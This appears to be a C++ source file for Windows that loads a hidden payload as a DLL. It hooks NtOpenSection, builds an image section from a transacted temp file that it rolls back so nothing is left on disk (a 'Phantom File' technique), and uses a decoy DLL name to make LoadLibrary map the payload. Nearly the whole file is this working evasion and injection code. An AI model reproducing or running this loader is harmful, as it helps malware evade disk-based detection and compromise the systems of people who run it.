//
// Created by sexey on 14.01.2026.
//

#include <atomic>
#include <string>
#include <windows.h>
#include <winternl.h>
#include <ktmw32.h>
#include <memory>
#include <span>
#include <iostream>

#include "payload.h"

import radiance;

//
// NT API Definitions
//

#ifndef STATUS_SUCCESS
    #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

using NtOpenSection_t = NTSTATUS(NTAPI*)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
);

using NtCreateSection_t = NTSTATUS(NTAPI*)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
);

//
// Global Context & Configuration
//

namespace config
{
    constexpr wchar_t DecoyDllName[] = L"nevermore.dll";
    constexpr wchar_t TempFileName[] = L"meth.mind";
}

struct injection_context_s
{
    std::atomic<bool> isHookActive{false};
    HANDLE payloadSection{nullptr};

    // Original API pointers
    NtOpenSection_t NtOpenSection{nullptr};
    NtCreateSection_t NtCreateSection{nullptr};

    static injection_context_s& Instance()
    {
        static injection_context_s ctx;
        return ctx;
    }

    injection_context_s()
    {
        HMODULE ntdll = GetModuleHandleA("ntdll");
        if (ntdll) {
            NtOpenSection = (NtOpenSection_t)GetProcAddress(ntdll, "NtOpenSection");
            NtCreateSection = (NtCreateSection_t)GetProcAddress(ntdll, "NtCreateSection");
        }
    }
};

//
// Helper RAII wrappers
//

struct handle_deleter_s
{
    using pointer = HANDLE;
    void operator()(HANDLE handle) const
    {
        if (handle && handle != INVALID_HANDLE_VALUE) {
            CloseHandle(handle);
        }
    }
};
using scoped_handle_t = std::unique_ptr<HANDLE, handle_deleter_s>;

//
// Hook Implementation
//

NTSTATUS NTAPI hkNtOpenSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes)
{
    auto& ctx = injection_context_s::Instance();

    // Check if hook is active and object attributes are valid
    if (ctx.isHookActive && ObjectAttributes && ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) {

        // Case-insensitive comparison (basic implementation since we don't link full ntdll helpers)
        const auto* openedName = ObjectAttributes->ObjectName->Buffer;
        if (_wcsicmp(openedName, config::DecoyDllName) == 0 ||
            // Also check if it ends with our decoy name (simple heuristic)
            (wcslen(openedName) >= wcslen(config::DecoyDllName) &&
             _wcsicmp(openedName + wcslen(openedName) - wcslen(config::DecoyDllName), config::DecoyDllName) == 0))
        {
            // Redirect to our payload section
            if (DuplicateHandle(
                GetCurrentProcess(),
                ctx.payloadSection,
                GetCurrentProcess(),
                SectionHandle,
                0,
                FALSE,
                DUPLICATE_SAME_ACCESS
            )) {
                // One-shot hook: disable after successful interception
                ctx.isHookActive = false;
                return STATUS_SUCCESS;
            }
        }
    }

    // Call original function
    return ctx.NtOpenSection(SectionHandle, DesiredAccess, ObjectAttributes);
}

//
// Utilities
//

/*
 * Creates a section backed by a transacted file (Phantom File technique).
 * The file is created within a transaction which is immediately rolled back,
 * leaving no trace on disk, but the section remains valid in memory.
 */
HANDLE CreatePhantomSection(const std::span<uint8_t>& payload)
{
    const auto& ctx = injection_context_s::Instance();
    if (!ctx.NtCreateSection) return nullptr;

    scoped_handle_t transaction(CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr));
    if (!transaction || transaction.get() == INVALID_HANDLE_VALUE) {
        return nullptr;
    }

    wchar_t tempPath[MAX_PATH + 1];
    if (!GetTempPathW(MAX_PATH, tempPath)) {
        return nullptr;
    }

    std::wstring filePath = std::wstring(tempPath) + config::TempFileName;
    scoped_handle_t file(CreateFileTransactedW(
        filePath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        0, // No sharing
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr,
        transaction.get(),
        nullptr,
        nullptr
    ));

    if (!file || file.get() == INVALID_HANDLE_VALUE) {
        return nullptr;
    }

    DWORD written;
    if (!WriteFile(file.get(), payload.data(), static_cast<DWORD>(payload.size()), &written, nullptr)) {
        return nullptr;
    }

    HANDLE section = nullptr;
    NTSTATUS status = ctx.NtCreateSection(
        &section,
        SECTION_ALL_ACCESS,
        nullptr,
        nullptr,
        PAGE_READONLY,
        SEC_IMAGE,
        file.get()
    );

    if (status != STATUS_SUCCESS) {
        return nullptr;
    }

    // Rollback the transaction to hide the file
    RollbackTransaction(transaction.get());

    return section;
}

int main()
{
    auto& ctx = injection_context_s::Instance();
    if (!ctx.NtOpenSection || !ctx.NtCreateSection) {
        std::cerr << "[-] Failed to resolve NT API." << std::endl;
        return -1;
    }

    // 1. Initialize Radiance Hooking Engine
    radiance::C_Radiance radiance;
    const auto ntOpenSectionHook = radiance.create(
        reinterpret_cast<void*>(ctx.NtOpenSection),
        reinterpret_cast<void*>(hkNtOpenSection)
    );

    if (!ntOpenSectionHook) {
        std::cerr << "[-] Failed to hook NtOpenSection." << std::endl;
        return -1;
    }

    // 2. Prepare Phantom Section with Payload
    const auto section = CreatePhantomSection({ PAYLOAD, sizeof(PAYLOAD )});
    if (!section) {
        std::cerr << "[-] Failed to create phantom section." << std::endl;
        return -1;
    }

    std::cout << "[+] Phantom section created. Handle: " << section << std::endl;

    // 3. Setup Injection Context
    ctx.isHookActive = true;
    ctx.payloadSection = section;

    // 4. Trigger LoadLibrary to invoke NtOpenSection
    // The hook will intercept the request for the decoy DLL and return our section.
    std::cout << "[*] Triggering injection via LoadLibraryA..." << std::endl;
    auto hModule = LoadLibraryW(config::DecoyDllName);
    if (hModule) {
        std::cout << "[+] Payload loaded successfully at: " << hModule << std::endl;
    } else {
        std::cerr << "[-] LoadLibrary failed." << std::endl;
    }

    // 5. Cleanup
    ntOpenSectionHook->uninstall();

    std::cin.get();
}